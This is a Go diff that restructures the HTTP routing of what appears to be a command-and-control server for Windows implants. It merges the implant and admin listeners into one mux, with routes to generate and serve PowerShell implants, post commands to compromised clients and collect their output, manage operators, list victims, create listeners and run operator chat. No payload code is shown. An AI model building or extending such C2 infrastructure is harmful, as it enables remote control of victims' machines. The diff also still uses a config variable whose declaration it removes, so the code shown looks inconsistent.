@@ -10,8 +10,7 @@ import (
 )
 
 var (
-	db     *sql.DB
-	config []Configuration
+	db *sql.DB
 )
 
 func main() {
@@ -30,42 +29,38 @@ func main() {
 		panic(err)
 	}
 
-	// First server config
-	serverIP1 := config[0].Server[0].IP
-	serverPort1 := config[0].Server[0].Port
-	var socket1 = serverIP1 + ":" + serverPort1
-
 	// Second server config
-	serverIP2 := config[0].Server[1].IP
-	serverPort2 := config[0].Server[1].Port
-	var socket2 = serverIP2 + ":" + serverPort2
-
-	// Mux for server1
-	mux1 := http.NewServeMux()
-	mux1.HandleFunc("/registerNewImplant", registerNewImplant)
-	mux1.HandleFunc("/fetchCommand", fetchCommand)
-	mux1.HandleFunc("/fetchOutput", fetchOutput)
-	mux1.HandleFunc("/agents/windows/cs", windowsImplant)
+	serverIP := config[0].Server[1].IP
+	serverPort := config[0].Server[1].Port
+	var socket = serverIP + ":" + serverPort
 
 	// Mux for server2
-	mux2 := http.NewServeMux()
-	mux2.HandleFunc("/agents/windows/powershell", powerShellImplant)
-	mux2.HandleFunc("/generate/windows/implant", generateImplant)
-	mux2.HandleFunc("/getStoredOutput", getStoredOutput)
-	mux2.HandleFunc("/operators/register", registerOperatorHandler)
-	mux2.HandleFunc("/operators/login", loginOperatorHandler)
-	mux2.HandleFunc("/getClients", getClients)
+	mux := http.NewServeMux()
 
-	go func() {
-		fmt.Println("Implant Server: " + socket1)
-		err := http.ListenAndServe(socket1, mux1)
-		if err != nil {
-			log.Fatal("ListenAndServe for socket1: ", err)
-		}
-	}()
+	// Implant Handling
+	mux.HandleFunc("/agents/windows/powershell", powerShellImplant)
+	mux.HandleFunc("/generate/windows/implant", generateImplant)
 
-	fmt.Println("Admin Server: " + socket2)
-	err = http.ListenAndServe(socket2, mux2)
+	// Instructions for Implants handling
+	mux.HandleFunc("/getOutput", getOutput)
+	mux.HandleFunc("/postCommand", postCommand)
+
+	// Register and Login for Operators
+	mux.HandleFunc("/operators/register", registerOperatorHandler)
+	mux.HandleFunc("/operators/login", loginOperatorHandler)
+
+	// Get all Clients registered in the database
+	mux.HandleFunc("/getClients", getClients)
+
+	// Create unique listeners for multiple implants
+	mux.HandleFunc("/generate/listener", createListener)
+
+	// Chat system
+	mux.HandleFunc("/messagePost", messagePost)
+	mux.HandleFunc("/messageGet", messageGet)
+
+	fmt.Println("Admin Server: " + socket)
+	err = http.ListenAndServe(socket, mux)
 	if err != nil {
 		log.Fatal("ListenAndServe for socket2: ", err)
 	}
